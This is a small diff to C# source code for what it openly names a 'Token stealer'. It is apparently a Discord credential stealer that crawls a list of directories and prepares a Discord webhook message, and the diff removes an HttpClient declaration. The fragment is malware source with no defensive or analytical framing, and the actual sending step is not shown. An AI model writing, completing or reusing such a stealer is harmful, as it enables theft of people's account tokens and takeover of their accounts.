@@ -36,7 +36,6 @@ string[] crawl = new[]
 
 DirectoryInfo[] Crawl = crawl.Select(x => new DirectoryInfo(x)).ToArray();
 
-using HttpClient client = new();
 DiscordMessage message = new()
 {
     Username = "Token stealer"
